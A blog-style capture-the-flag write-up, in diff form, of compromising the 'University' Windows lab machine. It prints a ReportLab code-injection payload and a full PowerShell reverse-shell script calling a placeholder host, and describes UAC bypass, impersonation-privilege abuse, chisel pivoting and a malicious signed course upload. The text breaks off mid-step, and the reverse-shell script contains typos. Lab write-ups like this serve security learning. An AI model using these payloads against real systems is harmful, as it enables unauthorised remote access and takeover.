@@ -1,0 +1,410 @@
+---
+layout: post
+title: "University-Windows-Insane"
+date:   2025-08-09 8:05:57 -0400
+categories: writeups
+thumb: /assets/images/logos/1d7d081a4ea7d6b2ad0fc231599f9edd.png
+---
+
+# University
+
+# 1. Enumeration
+
+Start Enumerating using nmap, there are multiple ports open as is normal in windows machines
+<br/><br/>
+![image.png]({{ '/assets/images/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4_image.png' | relative_url }})
+<br/><br/>
+First, let’s check the web application running on port 80
+<br/><br/>
+![image.png]({{ '/assets/images/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4_image_1.png' | relative_url }})
+<br/><br/>
+There is an university web page, we can register as professors, but first we will need approval for admins 
+<br/><br/>
+![image.png]({{ '/assets/images/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4_image_2.png' | relative_url }})
+<br/><br/>
+According with the situation, the best option would be register ourselves as students
+<br/><br/>
+![image.png]({{ '/assets/images/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4_image_3.png' | relative_url }})
+<br/><br/>
+![image.png]({{ '/assets/images/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4_image_4.png' | relative_url }})
+<br/><br/>
+Now, we discover another sign in option using signed certificates, but for now we are just going to sign with username and password
+<br/><br/>
+![image.png]({{ '/assets/images/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4_image_5.png' | relative_url }})
+<br/><br/>
+Once inside, we have several functionalities that we could to test
+<br/><br/>
+![image.png]({{ '/assets/images/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4_image_6.png' | relative_url }})
+<br/><br/>
+We can even request a signed certificate
+<br/><br/>
+![image.png]({{ '/assets/images/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4_image_7.png' | relative_url }})
+<br/><br/>
+But for now we are going to focus on this CKEditor, checking the source code, it is running CKEditor and it has a XSS vulnerability
+<br/><br/>
+![image.png]({{ '/assets/images/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4_image_8.png' | relative_url }})
+<br/><br/>
+# 2. User flag - Priv esc (Unintended)
+<br/><br/>
+But reviewing the source code, we found a new functionality that we can trigger calling the `/account/profile/pdf` endpoint through a GET request
+<br/><br/>
+![image.png]({{ '/assets/images/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4_image_9.png' | relative_url }})
+<br/><br/>
+Basically it takes the whole information we have in our profile, and it creates a .pdf file 
+<br/><br/>
+![image.png]({{ '/assets/images/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4_image_10.png' | relative_url }})
+<br/><br/>
+We can inspect metadata information inside of the pdf file to discover that it is creates thanks to ReportLab, which is a python library with a known vulnerability
+<br/><br/>
+![image.png]({{ '/assets/images/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4_image_11.png' | relative_url }})
+<br/><br/>
+![image.png]({{ '/assets/images/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4_image_12.png' | relative_url }})
+<br/><br/>
+Luckily or unluckily this version of report lab is vulnerable
+<br/><br/>
+![image.png]({{ '/assets/images/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4_image_13.png' | relative_url }})
+<br/><br/>
+![image.png]({{ '/assets/images/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4_image_14.png' | relative_url }})
+<br/><br/>
+But after a while, the payload is interpreted and executed but there is something wrong with it because we cannot get RCE at all. After a little research we found that the problem resided on the False statement, it is not well interpreted by the engine i think it has Jinja or something like that behind so we just change `False` to `1=0` , it should works.
+<br/><br/>
+
+```jsx
+<para><font color="[[ 
+#Gets global from pow
+	getattr(
+		pow,
+		Word('__globals__')
+	)['os'].system('payload') #Execute the payload 
+#creates a list 
+for Word in [
+	#It creates new classes dinamically
+	orgTypeFun('Word',(str), {
+		'mutated':1, 
+		'startswith': lambda self,x: 1=0,
+		'__eq__':lambda self, x: 
+			self.mutate() and #Evaluates mutate
+			self.mutate < 0 and 
+			str(self) == x, 
+		'mutate':lambda self: { #Here mutates decrease
+			setattr(self,'mutated', self.mutated -1)
+		}, 
+		'__hash__': lambda self: hash(str(self))
+		})
+	]] 
+	for orgTypeFun in [type(type(1))]
+] and 'red'">
+anything
+</font></para>
+```
+
+<br/><br/>
+First save the reverse shell into the system 
+<br/><br/>
+![image.png]({{ '/assets/images/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4_image_15.png' | relative_url }})
+<br/><br/>
+Then execute it using powershell
+<br/><br/>
+![image.png]({{ '/assets/images/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4_image_16.png' | relative_url }})
+<br/><br/>
+
+```powershell
+#Stablishin a connection
+$TCPClient = New-Object Net.Sockets.TCPClient('x.x.x.x', pppp);
+#Getting network workflow
+$NetworkStram = $TCPClient.GetStream();
+#Creates a writer to send information through the network flow
+$StreamWriter = New-Object IO.StreamWriter($NetworStream);
+#Function to write through the network flow (sending information)
+function WriteToStream ($String) {
+	#Inizializing a buffer of bytes
+	[byte[]]
+	$Script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};
+	#Write informatio
+	$StreamWriter.Write($String + 'SHELL> ');
+	#Making sure the information is sent
+	$StreamWriter.Flush()
+}
+#Calls the function
+WriteToStream '';
+#Receiving information, read throught the network flow
+while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0){
+	#Read the information received in UTF8
+	$Command = ([text.encoding]::UTF8).GetString($Buffer, 0. $BytesRead -1);
+	$Output = try {
+	#Try to execute commands and capture errors
+		Invoke-Expression $Command 2>&1 | Out-String
+	}catch{
+	#If there is an error, takes the error and converting it to string
+		$_ | Out-String
+	}WriteToStream ($Output) #Write the output to send it 
+}
+$StreamWriter.Close()
+```
+
+<br/><br/>
+![image.png]({{ '/assets/images/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4_image_17.png' | relative_url }})
+<br/><br/>
+Now we have a shell as wao
+<br/><br/>
+![image.png]({{ '/assets/images/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4_image_18.png' | relative_url }})
+<br/><br/>
+Here we have sensible information and files of the Certification Authotiry
+<br/><br/>
+![image.png]({{ '/assets/images/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4_image_19.png' | relative_url }})
+<br/><br/>
+We also have some certificates
+<br/><br/>
+![image.png]({{ '/assets/images/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4_image_20.png' | relative_url }})
+<br/><br/>
+But at the moment to try to log in with them we have an error message
+<br/><br/>
+![image.png]({{ '/assets/images/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4_image_21.png' | relative_url }})
+<br/><br/>
+We keep it up digging inside, there is a sqlite file
+<br/><br/>
+![image.png]({{ '/assets/images/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4_image_22.png' | relative_url }})
+<br/><br/>
+We have tokens, and hashes
+<br/><br/>
+![image.png]({{ '/assets/images/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4_image_23.png' | relative_url }})
+<br/><br/>
+But first we saw before and automation made with powershell
+<br/><br/>
+![image.png]({{ '/assets/images/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4_image_24.png' | relative_url }})
+<br/><br/>
+It is zipping the backup but is disclosing Wao’s password
+<br/><br/>
+![image.png]({{ '/assets/images/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4_image_25.png' | relative_url }})
+<br/><br/>
+Just for curiosity we can try to bypass user account control UAC 
+<br/><br/>
+![image.png]({{ '/assets/images/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4_image_26.png' | relative_url }})
+<br/><br/>
+![image.png]({{ '/assets/images/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4_image_27.png' | relative_url }})
+<br/><br/>
+Create a revshell and try to execute it with runascs
+<br/><br/>
+![image.png]({{ '/assets/images/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4_image_28.png' | relative_url }})
+<br/><br/>
+Set the listener
+<br/><br/>
+![image.png]({{ '/assets/images/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4_image_29.png' | relative_url }})
+<br/><br/>
+Uploading the reverse shell
+<br/><br/>
+![image.png]({{ '/assets/images/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4_image_30.png' | relative_url }})
+<br/><br/>
+Uploading RunasCs
+<br/><br/>
+![image.png]({{ '/assets/images/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4_image_31.png' | relative_url }})
+<br/><br/>
+Use credentials found, and bypassuac and logon type 5 which means service logon, simulating a service running with the machine is started
+<br/><br/>
+![image.png]({{ '/assets/images/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4_image_32.png' | relative_url }})
+<br/><br/>
+Now we have different privileges, some of them are disabled but we can use tools like godpotato to abuse them
+<br/><br/>
+![image.png]({{ '/assets/images/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4_image_33.png' | relative_url }})
+<br/><br/>
+In this case we are going to take advantage of Metasploit `seimpersonateprivilege` 
+<br/><br/>
+![image.png]({{ '/assets/images/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4_image_34.png' | relative_url }})
+<br/><br/>
+System achieved, now just get hashes to log in as administrator
+<br/><br/>
+![image.png]({{ '/assets/images/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4_image_35.png' | relative_url }})
+<br/><br/>
+Machines pwned!!!!
+<br/><br/>
+# Intended
+<br/><br/>
+The procedure shown above we presented an unintended way, but as we want to take advantage of the knowledge this machine could offers let's take a look at the right way.
+<br/><br/>
+We need to start in the way which a user has access to the certification authority which is in charge of sign certificates to make professor account access to university web application 
+<br/><br/>
+![image.png]({{ '/assets/images/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4_image_36.png' | relative_url }})
+<br/><br/>
+First we tried to create our own certificate, but it didn't work because those certificates has specific attributes that we may no taking account
+<br/><br/>
+![image.png]({{ '/assets/images/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4_image_37.png' | relative_url }})
+<br/><br/>
+![image.png]({{ '/assets/images/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4_image_38.png' | relative_url }})
+<br/><br/>
+![image.png]({{ '/assets/images/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4_image_39.png' | relative_url }})
+<br/><br/>
+That's why it is a better option to take an existing certificate a sign it.
+<br/><br/>
+![image.png]({{ '/assets/images/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4_image_40.png' | relative_url }})
+<br/><br/>
+![image.png]({{ '/assets/images/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4_image_41.png' | relative_url }})
+<br/><br/>
+![image.png]({{ '/assets/images/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4_image_42.png' | relative_url }})
+<br/><br/>
+We got martin certificate, now we can log in as him.
+<br/><br/>
+![image.png]({{ '/assets/images/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4_image_43.png' | relative_url }})
+<br/><br/>
+Now we can see there are some new functionalities, but if we check in the machine we are not going to see this user, could it be a rabbit hole? 
+<br/><br/>
+With `Get-ADComputer -Filter *` we got information about other machines running in the active directory domain
+<br/><br/>
+LAB-2 and WS-3 Are machines where we have direct connection in the machine which is the DC machine
+<br/><br/>
+![image.png]({{ '/assets/images/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4_image_44.png' | relative_url }})
+<br/><br/>
+![image.png]({{ '/assets/images/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4_image_45.png' | relative_url }})
+<br/><br/>
+LAB-2 seems to be a linux machine
+<br/><br/>
+WS-3 seems to be a windows machine
+<br/><br/>
+![image.png]({{ '/assets/images/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4_image_46.png' | relative_url }})
+<br/><br/>
+If we want to know more about those machine we could try to log on there with wao credentials, but before we need to set the corresponding pivoting and forwarding environment.
+<br/><br/>
+I don’t think next step is fully necessary in this machine but it is better to be sure we are sign-in to DC machine
+<br/><br/>
+![image.png]({{ '/assets/images/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4_image_47.png' | relative_url }})
+<br/><br/>
+Now set the chisel server with 
+<br/><br/>
+
+```python
+#Establishing a proxy server allowing to access to restricted network segements 
+#Thanks to -reverse redirection
+chisel server --socks5 -reverese -p 5555
+```
+
+<br/><br/>
+![image.png]({{ '/assets/images/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4_image_48.png' | relative_url }})
+<br/><br/>
+Now set the client reversing network stream
+<br/><br/>
+![image.png]({{ '/assets/images/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4_image_49.png' | relative_url }})
+<br/><br/>
+Be sure `/etc/proxychains4.conf` has proper configuration to intercept that connection and redirect it to that port
+<br/><br/>
+![image.png]({{ '/assets/images/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4_image_50.png' | relative_url }})
+<br/><br/>
+Now we have made that pivoting movement and we have got access to other machines, first one `LAB-2` which is a Linux machine, didn’t have anything interesting, we could check a little bit deeper how the web application works but we are going to focus on WS-3 machine
+<br/><br/>
+![image.png]({{ '/assets/images/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4_image_51.png' | relative_url }})
+<br/><br/>
+Logon with wao creds to WS-3 machine
+<br/><br/>
+![image.png]({{ '/assets/images/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4_image_52.png' | relative_url }})
+<br/><br/>
+In the desktop we have a clue for the privilege escalation, and some other information about the infrastructure we are handle with, also we don’t have privileges here let’s find a way to escalate as martin here, taking account that we have access to him in the web application and his profile is present as a user in this machine
+<br/><br/>
+![image.png]({{ '/assets/images/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4_image_53.png' | relative_url }})
+<br/><br/>
+checking http paths, there is a upload part, as martin we could trigger something
+<br/><br/>
+![image.png]({{ '/assets/images/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4_image_54.png' | relative_url }})
+<br/><br/>
+create a temp directory and set a rev shell executing netcat
+<br/><br/>
+![image.png]({{ '/assets/images/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4_image_55.png' | relative_url }})
+<br/><br/>
+We are redirecting to DC machine because it will be set to redirect traffic to WS-3 machine
+<br/><br/>
+![image.png]({{ '/assets/images/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4_image_56.png' | relative_url }})
+<br/><br/>
+![image.png]({{ '/assets/images/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4_image_57.png' | relative_url }})
+<br/><br/>
+We can upload courses into the web application as martin, but those files need to be signed with the private key of that user to match keys and be sure that users is uploading a valid file
+<br/><br/>
+Generate a key pair
+<br/><br/>
+![image.png]({{ '/assets/images/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4_image_58.png' | relative_url }})
+<br/><br/>
+Upload the public key 
+<br/><br/>
+![image.png]({{ '/assets/images/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4_image_59.png' | relative_url }})
+<br/><br/>
+Now we can create a malicious course, it would be a shortcut.url which will execute the rev shell when it is handled
+<br/><br/>
+![image.png]({{ '/assets/images/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4_image_60.png' | relative_url }})
+<br/><br/>
+zip the file 
+<br/><br/>
+![image.png]({{ '/assets/images/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4_image_61.png' | relative_url }})
+<br/><br/>
+Now we need to forward just one port, this is because we need to listen in our local machine using proxychains, we kill the session forwarding all the traffic because we don’t need to logon as wao in WS-3 anymore
+<br/><br/>
+![image.png]({{ '/assets/images/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4_image_62.png' | relative_url }})
+<br/><br/>
+![image.png]({{ '/assets/images/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4_image_63.png' | relative_url }})
+<br/><br/>
+Now that everything is set, we proceed to upload the .zip file that will trigger our exploit, to make this possible get a private key signed file
+<br/><br/>
+![image.png]({{ '/assets/images/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4_image_64.png' | relative_url }})
+<br/><br/>
+![image.png]({{ '/assets/images/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4_image_65.png' | relative_url }})
+<br/><br/>
+![image.png]({{ '/assets/images/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4_image_66.png' | relative_url }})
+<br/><br/>
+We had 500 response but we have received connection as martin.t
+<br/><br/>
+![image.png]({{ '/assets/images/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4_image_67.png' | relative_url }})
+<br/><br/>
+Finally the user flag
+<br/><br/>
+![image.png]({{ '/assets/images/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4_image_68.png' | relative_url }})
+<br/><br/>
+As we saw before we are in a machine that hasn’t been uploaded since 2023, that means that probably is vulnerable to CVE-2023-21746 which takes advantage of NTLM authentication, we will use a automation script with elevated privileges to get SYSTEM access
+<br/><br/>
+![image.png]({{ '/assets/images/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4_image_69.png' | relative_url }})
+<br/><br/>
+Execute the PoC as shown below, basically we write in a file and then activate an instance of that object, the machine is pretty tricky we might need to do it various times.
+Before executing the .exe we need to take account that we have to redirect another port to WS-3 to get access
+<br/><br/>
